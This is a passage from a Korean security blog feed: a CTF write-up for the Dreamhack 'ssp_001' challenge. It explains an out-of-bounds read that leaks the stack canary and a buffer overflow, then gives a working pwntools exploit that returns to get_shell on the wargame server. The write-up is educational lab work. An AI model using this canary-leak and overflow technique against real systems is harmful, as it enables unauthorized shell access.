&lt;p&gt;선택지 P를 처리하는 어셈블리 라인에서는 주목할 만한 행위 두 가지가 보인다. 바로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf(&quot;{some words}{format_string}&quot;, *(ebp-0x94))&lt;/code&gt; 와 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;print_box&lt;/code&gt; 를 콜하는 것이다. 먼저 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x94&lt;/code&gt; 에 저장되는 것은 어셈블리어만을 보고 알 수는 없다. 32비트 환경에서의 주소값과 int 값은 동일한 4byte로 어셈블리어 상에서 구분이 안 되기 때문이다. 따라서 동적으로 분석해야만 한다. 그 결과, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x94&lt;/code&gt; 에는 int가 저장되는 것을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그렇다면 이제 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;print_box(ebp-0x88, ebp-0x94)&lt;/code&gt; 가 어떤 일을 하는지 알아보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%206.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0xc&lt;/code&gt; 는 인자로 줬던 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x94&lt;/code&gt; 가 저장된 곳이고, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x8&lt;/code&gt;은 인자로 줬던 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x88&lt;/code&gt;이 저장된 곳이다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-x088&lt;/code&gt;을 a, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x94&lt;/code&gt;를 b라고 하면 a+b를 한 단위가 1바이트인 주소로 참조해 해당 주소에 저장된 하위 1바이트를 eax에 저장하여 printf에게 주는 인자로 사용한다. 이건 거꾸로 KTX를 타고 가면서 봐도 사용자에게 입력받았던 값을 index로 하여 char 배열을 참조한 다음, 해당 위치에 저장된 값을 출력해 주는 것처럼 보인다.&lt;/p&gt;

&lt;p&gt;이 지점에서 OOB(Out-Of-Bound)가 가능한 것으로 추측된다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;124-선택지-e의-경우&quot;&gt;1.2.4. 선택지 [E]의 경우&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%207.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf&lt;/code&gt;와 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt;함수를 사용하는 것이 눈에 띈다. 아까부터 각 branch별로 특정 함수들을 강조하는데, 그 이유는 이들이 사용자와 interaction하는, 취약성을 내재할 확률이 가장 큰 부분이기 때문이다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanf(”{string}{format_string}”, *(ebp-0x90))&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read(0, *(ebp-0x48), *(ebp-0x90)&lt;/code&gt; 을 보면 사용자로부터 입력받아 저장되는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x90&lt;/code&gt; 이 int라는 것을 알 수 있다.&lt;/p&gt;

&lt;p&gt;즉, 사용자에게 특정 숫자를 받고, 그 숫자만큼의 글자를 입력받는 행위를 하고 있다. 이는 매우 취약한 코드인데, 검증되지 않은 입력을 검증하기 위한 boundary check 마저 검증되지 않은 소스에게 의존하고 있기 때문이다.&lt;/p&gt;

&lt;p&gt;해당 행위를 수행한 다음, 사진에는 잘려 있지만 스택 카나리를 확인하여 main 함수를 끝내는 플로우로 이어진다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-취약점-지정-및-익스플로잇-방법-선정&quot;&gt;2. 취약점 지정 및 익스플로잇 방법 선정&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;21-분석-요약-및-필요한-정보-선정&quot;&gt;2.1. 분석 요약 및 필요한 정보 선정&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;앞에서 분석한 내용을 요약하면 아래와 같다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;F 옵션: 사용자의 입력을 buf에 저장한다.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;P 옵션: 사용자의 int type 입력 x 를 받아 buf[x]를 참조해 출력한다. 여기에서 OOB로 인한 Memory Leak이 가능하다. (아래 사진 참고-buf는 0x40 길이이므로 인덱스의 한계는 63이지만 70번 인덱스에 접근 가능하다)&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%208.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;E 옵션: 사용자로부터 입력값의 길이 y를 받고, read 함수로 y 만큼의 입력을 받아 buf2에 저장한다. 해당 작업이 끝나면 프로그램을 종료한다. 여기에서 잘못된 boundary check로 인한 BOF 취약점이 발생한다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;해당 프로그램을 익스플로잇하기 위해서 필요한 정보는 아래와 같다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;해당 프로그램에 걸려 있는 보호 기법의 목록&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%209.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;ASLR은 꺼져 있을 것이다.(현재 커리큘럼상)&lt;/li&gt;
      &lt;li&gt;NX enabled 이므로 스택에는 실행 권한이 없다. 즉, RTL이나 PLT&amp;amp;GOT overwrite 등으로 우회해야만 한다.&lt;/li&gt;
      &lt;li&gt;RELRO가 Partial로 걸려 있다. 이 경우 GOT에는 RO가 걸리지 않으므로 GOT 변조로 우회 가능하다.&lt;/li&gt;
      &lt;li&gt;스택 카나리가 걸려 있다. FSB 혹은 OOB 등으로 Canary Leak을 하는 것이 현실적인 우회 기법이다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;스택 카나리의 값
    &lt;ul&gt;
      &lt;li&gt;P 옵션 실행 시 OOB로 인한 Canary Leak이 가능해 보인다.&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;그렇다면 사용자 입력값으로 얼마를 줘야 할까?&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;스택 프레임을 오염시키고 무한 루프를 종료할 수 있는 코드 플로우
    &lt;ul&gt;
      &lt;li&gt;E 옵션 실행 시 두 가지가 BOF로 인해 모두 가능하다.&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;ASLR이 꺼져 있고, NX enabled인 상황에서 가장 쉽게 가능한 방식인 RTL을 수행하기 위해 작성해야 하는 페이로드 구성은 무엇이 될까?&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;22-필요한-정보-알아내기&quot;&gt;2.2. 필요한 정보 알아내기&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;221-p-옵션상에서-사용자-입력값으로-무엇을-줘야-canary-leak이-가능할까&quot;&gt;2.2.1. [P] 옵션상에서, 사용자 입력값으로 무엇을 줘야 Canary Leak이 가능할까?&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;P 옵션을 줬을 때 읽어오는 항목인 box 배열의 시작 지점이 스택의 어디에 할당되었는지 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%2010.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ebp-0x88 지점이다.&lt;/p&gt;

&lt;p&gt;그렇다면 스택 카나리는 어디에 저장되는지 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%2011.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ebp-0x8 지점이다.&lt;/p&gt;

&lt;p&gt;즉, box[0x80] 지점이 스택 카나리의 시작점일 것으로 추정된다. 정말인지 확인해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%2012.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;메모리를 낮은 주소에서부터 읽어오는 점, 그리고 현재 프로세서가 리틀 엔디안이라는 점을 감안하면 아마 스택 카나리의 값은 0x1e831700일 것이다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%2013.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;실제로 확인해 보니 일치하는 것을 알 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;222-e-옵션-실행-시-삽입될-페이로드-구성은-어떻게-해야-할까&quot;&gt;2.2.2. [E] 옵션 실행 시 삽입될 페이로드 구성은 어떻게 해야 할까?&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;E 옵션을 줬을 때, 사용자가 입력할 길이를 지정하게 한 다음 입력을 받는다. 그렇다면 사용자의 입력을 받아 저장하는 버퍼의 위치는 어디일까?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%2014.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;read 함수의 두번째 인자로 저장될 버퍼의 주소가 들어가므로 현재 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main+302&lt;/code&gt; 에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eax&lt;/code&gt; 에 들어간 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ebp-0x48&lt;/code&gt; 이 인자가 저장될 주소이다.&lt;/p&gt;

&lt;p&gt;즉,&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;0x40 dump byte + 0x04 Stack Canary + 0x04 dump + 0x04 ebp + return address + 0x04 dump + parameters&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;가 삽입할 페이로드의 구성이 된다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;223-리턴-어드레스는-어디로-조작해야-할까&quot;&gt;2.2.3. 리턴 어드레스는 어디로 조작해야 할까?&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;1.1.에서 확인한 함수들의 이름 중 수상한 것이 두 개 있었다. 바로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; 과 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_shell&lt;/code&gt; 이었다. 전자를 사용할 수도 있지만 후자를 한 번 확인해 보고, 둘 중 무엇으로 코드 플로우를 변경하는 것이 효율적일지 고민해 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%2015.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/ssp_001/Untitled%2016.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;진짜로 KTX 타고 백덤블링하면서 봐도 system(”/bin/sh”)를 실행해 주는 함수다.&lt;/p&gt;

&lt;p&gt;현재 ASLR이 꺼져 있어, 사용된 라이브러리의 베이스 주소를 찾고 → system 함수의 오프셋을 찾고 → /bin/sh 문자열의 주소를 찾은 다음 RTL을 하는 것보다 그냥 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_shell&lt;/code&gt; 함수로 리다이렉션을 하는 게 훨씬 나아 보인다. 따라서 리턴 어드레스로는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_shell&lt;/code&gt; 의 주소를 줄 것이다.&lt;/p&gt;

&lt;p&gt;만일 ASLR이 켜져 있다면, OOB 취약점을 이용해 main의 리턴 어드레스까지를 읽어서(동일 버전으로 컴파일되었다면 main의 리턴 어드레스는 동일한 라이브러리 함수로 이어지기 때문에 libc base를 알아낼 수 있다) libc base를 알아내 RTL을 수행하는 게 더 쉬울지도 모른다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;23-취약점-익스플로잇-시나리오-세우기&quot;&gt;2.3. 취약점 익스플로잇 시나리오 세우기&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;따라서 가능한 취약점 익스플로잇 시나리오는 크게 두 단계로 나뉘며, 아래와 같다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;스택 카나리를 알아내는 과정
    &lt;ul&gt;
      &lt;li&gt;P, 131, P, 130, P, 129, P, 128을 입력하고 값을 받기를 반복한다.&lt;/li&gt;
      &lt;li&gt;받아온 값을 bytearray의 concatenate를 이용하여 조합해 p32() 함수로 패킹한다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;알아낸 카나리를 포함한 페이로드를 만들어 RTL이나 ROP를 성공시키는 과정
    &lt;ul&gt;
      &lt;li&gt;페이로드의 구성:
        &lt;ul&gt;
          &lt;li&gt;&lt;strong&gt;0x40 dump byte + 0x04 Stack Canary + 0x04 dump + 0x04 ebp + get_shell addr + 0x04 dump + parameters&lt;/strong&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-익스플로잇-작성-후-실행&quot;&gt;3. 익스플로잇 작성 후 실행&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./ssp_001&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;host3.dreamhack.games&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24236&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;get_shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;get_shell&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#get_shell 주소는 pwntools가 알아서 찾아줄 것이다
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# figuring out the stack canary
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;P&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;131&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;is : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# converting canary from str to int -&amp;gt; 32bit packed byte 
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# giving F option to do BOF exploitation and set the payload length
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;E&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Name Size : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;300&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# now constructing payload; 1) BOF 2) Canary 3) getting shell(NX bit enabled)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;dump2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ebp_dump&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;get_shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dump2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ebp_dump&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_shell&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# gdb.attach(p)
# raw_input(&quot;1&quot;)
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendlineafter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Name : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;그 결과, 플래그를 얻을 수 있었다. 플래그 인증샷은 스포가 되니 넣지 않을 것이다…&lt;/p&gt;
</description>
        <pubDate>Fri, 03 Feb 2023 07:44:23 -0600</pubDate>
        <link>https://touBVa.github.io/blog/dreamhack_system_hacking/step6/ssp_001</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/dreamhack_system_hacking/step6/ssp_001</guid>
      </item>
    
      <item>
        <title>System Hacking Step 6-1</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-스택-카나리란&quot; id=&quot;markdown-toc-0-스택-카나리란&quot;&gt;0. 스택 카나리란?&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-카나리의-작동-원리&quot; id=&quot;markdown-toc-1-카나리의-작동-원리&quot;&gt;1. 카나리의 작동 원리&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#11-카나리-비활성화-활성화-비교&quot; id=&quot;markdown-toc-11-카나리-비활성화-활성화-비교&quot;&gt;1.1. 카나리 비활성화-활성화 비교&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#111-카나리-비활성화의-경우&quot; id=&quot;markdown-toc-111-카나리-비활성화의-경우&quot;&gt;1.1.1. 카나리 비활성화의 경우&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#112-카나리-활성화의-경우&quot; id=&quot;markdown-toc-112-카나리-활성화의-경우&quot;&gt;1.1.2. 카나리 활성화의 경우&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#12--어셈블리-비교-분석-프롤로그와-에필로그의-차이&quot; id=&quot;markdown-toc-12--어셈블리-비교-분석-프롤로그와-에필로그의-차이&quot;&gt;1.2.  어셈블리 비교-분석; 프롤로그와 에필로그의 차이&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#121-fs가-대체-뭐야&quot; id=&quot;markdown-toc-121-fs가-대체-뭐야&quot;&gt;1.2.1. FS가 대체 뭐야?&lt;/a&gt;&lt;/li&gt;
